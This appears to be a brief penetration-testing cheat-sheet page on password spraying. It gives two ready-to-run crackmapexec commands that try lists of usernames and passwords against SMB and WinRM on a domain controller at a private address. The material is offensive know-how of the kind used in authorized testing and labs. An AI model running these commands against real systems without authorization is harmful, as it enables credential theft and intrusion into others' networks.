# Password Spraying



### SMB

**Password spray** a list of usernames against a domain controller.

{% code overflow="wrap" %}
```sh
crackmapexec smb 192.168.219.122 -u ./users.txt -p ./passwords.txt --continue-on-success
```
{% endcode %}



### WinRM

Spray passwords against WinRM service on the domain controller:

{% code overflow="wrap" %}
```sh
crackmapexec winrm 192.168.219.122 -u ./users.txt -p ./passwords.txt --continue-on-success
```
{% endcode %}



